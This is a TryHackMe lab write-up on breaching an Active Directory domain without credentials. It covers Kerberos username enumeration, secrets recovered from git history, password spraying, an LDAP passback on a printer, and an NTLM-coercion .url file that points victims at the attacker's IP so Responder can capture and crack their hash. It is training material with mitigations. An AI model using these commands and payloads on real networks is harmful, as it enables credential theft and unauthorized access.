# Intro to AD Breaching — TryHackMe Writeup

**Room:** Intro to AD Breaching  
**Platform:** TryHackMe  
**Difficulty:** Easy/Medium  
**Author:** Artem  
**Tags:** Active Directory, OSINT, Kerberos User Enumeration, Password Spraying, Git Credential Leaks, Jenkins, LDAP Passback, Forced Authentication, NTLMv2, Responder, SCF File Attack

---

## Overview

This room focuses on the **initial breach** phase of Active Directory penetration testing — the stage where you have **zero credentials** and must obtain your first valid domain account. It covers OSINT-based username harvesting, Kerberos enumeration, password spraying, credential leaks in source control and CI/CD, LDAP passback attacks on printers, and file-based NTLM coercion via writable SMB shares.

---

## Lab Environment

| Host | IP | Role |
|---|---|---|
| ROOTDC (RDC1) | 192.168.12.100 | Domain Controller (AD DS, DNS, Kerberos) |
| SERVER1 | 192.168.12.51 | File Server (writable SMB share) |
| WRK | 192.168.12.61 | Employee Workstation |
| WebServer | 192.168.12.71 | Gitea (`git.thm.loc`), Jenkins (`ci.thm.loc`), Printer (`printer.thm.loc`) |

**Domain:** `thm.loc`

---

## Environment Setup

### DNS Configuration

The domain controller serves as the internal DNS server. Since `/etc/resolv.conf` was a broken symlink to a non-existent systemd-resolved file, it had to be recreated:

```bash
rm /etc/resolv.conf
echo -e "nameserver 192.168.12.100\nnameserver 1.1.1.1" > /etc/resolv.conf
```

### Hosts File

```
192.168.12.100    thm.loc
192.168.12.71     git.thm.loc ci.thm.loc printer.thm.loc
192.168.12.51     SERVER1.thm.loc
```

### Verification

```bash
nslookup thm.loc
# → 192.168.12.100

nslookup -type=SRV _kerberos._tcp.thm.loc
# → rdc1.thm.loc, port 88
```

---

## Task 3 — OSINT & Kerberos User Enumeration

### Theory

In real engagements, tools like [linkedin2username](https://github.com/initstring/linkedin2username) scrape employee names from LinkedIn and generate username lists in common formats (`first.last`, `f.last`, `flast`, etc.).

In this lab, a username list was provided. The organization uses the **`first.last`** format.

### Kerberos Enumeration

Kerberos (TCP/88) reveals whether an account exists based on different error codes:
- **Exists:** `KDC_ERR_PREAUTH_REQUIRED`
- **Doesn't exist:** `KDC_ERR_C_PRINCIPAL_UNKNOWN`

This requires no password and causes no lockouts.

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt
```

**Result:** 43 valid usernames out of 101 tested, including:
- Standard users: `sarah.jones`, `alice.moore`, `james.wilson`, etc.
- Service accounts: `svc.jenkins`, `dev.intern`
- Built-in: `administrator`

Saved valid users for later use:

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt 2>&1 | grep "VALID" | awk '{print $7}' | cut -d'@' -f1 > valid_users.txt
```

---

## Task 4 — Credential Leaks in Git & CI/CD

### Cloning the Repository

An open Gitea repository was accessible at `http://git.thm.loc/megacorp-admin/webapp-deploy`:

```bash
git clone http://git.thm.loc/megacorp-admin/webapp-deploy
cd webapp-deploy
```

### Searching Git History

Files on disk showed no hardcoded secrets — they had been replaced with environment variables. However, **git history preserves everything**:

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

**Findings from commit history:**

| Secret | Value | Context |
|---|---|---|
| DB Password | `Jen5k1ns2025!` | Database / Jenkins |
| App Secret Key | `mc-webapp-s3cret-k3y` | Web application signing |
| Onboarding Password | `MegaCorp01!` | Default password for new employees |

A developer had committed credentials, then removed them in a subsequent commit titled *"Security: remove hardcoded credentials, use environment variables"* — but `git log -p` revealed both versions.

> **Lesson:** Deleting secrets from code is not enough. Git history must be rewritten using `git filter-branch` or `BFG Repo-Cleaner`.

---

## Task 5 — Password Spraying

### Understanding Lockout Policy

Before spraying, you should check the domain's lockout policy to avoid locking accounts. Key parameters:
- **Account Lockout Threshold** — failed attempts before lockout
- **Account Lockout Duration** — how long the lockout lasts
- **Reset Account Lockout Counter After** — when the counter resets

A single round of spraying (one password across all users) is generally safe even without knowing the policy, since it produces at most one failed attempt per account.

### Spraying with Kerbrute

Using the onboarding password found in git history:

```bash
kerbrute passwordspray -d thm.loc --dc 192.168.12.100 /root/valid_users.txt 'MegaCorp01!'
```

**Result — 2 accounts never changed their default password:**

| Username | Password |
|---|---|
| `dev.intern` | `MegaCorp01!` |
| `alice.moore` | `MegaCorp01!` |

> **First domain credentials obtained — breaching successful.**

---

## Task 6 — LDAP Passback Attack

### Theory

Network devices (printers, scanners) integrated with AD often store **LDAP bind credentials** in their web configuration. An LDAP passback attack redirects the LDAP connection to an attacker-controlled server to capture these credentials in plaintext.

### Execution

1. Accessed the printer web interface at `http://printer.thm.loc`
2. Navigated to LDAP settings
3. Changed the LDAP server address to attacker IP (`192.168.21.20`) and port `3489` (port 389 was occupied on the AttackBox)
4. Started a listener:

```bash
nc -nlvp 3489
```

5. Clicked **Test Connection** on the printer

**Captured credentials:**

```
CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc
Password: Pr1ntBind2025!
```

### Verification

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'Pr1ntBind2025!'
# → STATUS_ACCOUNT_DISABLED
```

The account was disabled in AD, but the credentials were still configured in the printer — a common real-world finding.

> **Mitigation:** Use LDAPS (port 636) instead of LDAP (port 389) to encrypt traffic and prevent plaintext credential interception.

---

## Task 7 — File-Based Coercion (Forced Authentication)

### Theory (MITRE ATT&CK T1187)

When Windows Explorer opens a folder containing specially crafted files (SCF, URL, LNK), it automatically attempts to load icons from UNC paths, sending the current user's **NTLMv2 hash** to the specified server. The user doesn't need to click or execute anything — just opening the folder triggers the authentication.

### Execution

1. Enumerated writable shares:

```bash
nxc smb 192.168.12.51 -u dev.intern -p 'MegaCorp01!' --shares
# → shared-docs (READ,WRITE)
```

2. Started Responder:

```bash
sudo responder -I tun0
```

3. Created a malicious URL shortcut file:

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\192.168.21.20\icons\icon.ico
IconIndex=1
EOF
```

4. Uploaded to the writable share:

```bash
smbclient //192.168.12.51/shared-docs -U 'thm.loc\dev.intern%MegaCorp01!'
put @Shortcut.url
exit
```

5. Responder captured the NTLMv2 hash when a simulated user browsed the share:

```
[SMB] NTLMv2-SSP Username : THM\sarah.jones
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.12.61
```

### Cracking the Hash

```bash
hashcat -m 5600 sarah_hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `sarah.jones` : `Trustno1`

> **Note:** NTLMv2 hashes cannot be used for Pass-the-Hash — they must be cracked to plaintext. Strong passwords (15+ random characters) are practically uncrackable.

---

## Credentials Summary

| Username | Password | Source | Status |
|---|---|---|---|
| `dev.intern` | `MegaCorp01!` | Password spraying (git leak) | ✅ Active |
| `alice.moore` | `MegaCorp01!` | Password spraying (git leak) | ✅ Active |
| `svc.ldap` | `Pr1ntBind2025!` | LDAP passback (printer) | ❌ Disabled |
| `sarah.jones` | `Trustno1` | NTLMv2 crack (Responder + SCF) | ✅ Active |

---

## Key Takeaways

1. **Kerberos user enumeration** (port 88) reveals valid accounts without passwords and without triggering lockouts
2. **Git history** preserves deleted secrets — `git log -p` is essential during source code review
3. **Onboarding/default passwords** combined with password spraying is a high-success breaching vector
4. **LDAP passback** on printers/network devices can yield plaintext service account credentials
5. **File-based coercion** (SCF/URL files on writable shares) forces NTLM authentication without user interaction
6. **Defense:** enforce NTLMv2-only via GPO (`Network security: LAN Manager authentication level`), use LDAPS (port 636), enable SMB signing, and audit writable shares

---

## Tools Used

- **Kerbrute** — Kerberos user enumeration & password spraying
- **NetExec (nxc)** — SMB authentication, share enumeration, credential validation
- **smbclient** — SMB file upload
- **Responder** — NTLM hash capture
- **hashcat** — NTLMv2 hash cracking (mode 5600)
- **git** — Repository cloning & history analysis
- **nmap** — Port scanning & service discovery
- **nslookup / dig** — DNS enumeration

---

## Mistakes I Made

- **Forgot to specify domain in smbclient** — `smbclient -U 'dev.intern%MegaCorp01!'` failed; needed `'thm.loc\dev.intern%MegaCorp01!'`
- **Used wrong port for LDAP listener** — tried port 4444 initially; the room required port 3489 since 389 was occupied on AttackBox
- **resolv.conf was a broken symlink** — had to `rm /etc/resolv.conf` first, then create it as a regular file
- **Put `nameserver 1.1.1.1` in /etc/hosts** — confused hosts file syntax with resolv.conf; these are fundamentally different files
- **Didn't add hostname to /etc/hosts** — caused `sudo: unable to resolve host` errors until `127.0.0.1 ip-10-67-104-26` was added

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Gather Victim Identity Information | T1589.001 | LinkedIn OSINT for username harvesting |
| Brute Force: Password Spraying | T1110.003 | Spraying `MegaCorp01!` across valid users |
| Unsecured Credentials: Credentials in Files | T1552.001 | Hardcoded secrets in git commit history |
| Forced Authentication | T1187 | SCF/URL file on writable SMB share |
| Steal Application Access Token | T1528 | LDAP passback credential interception |
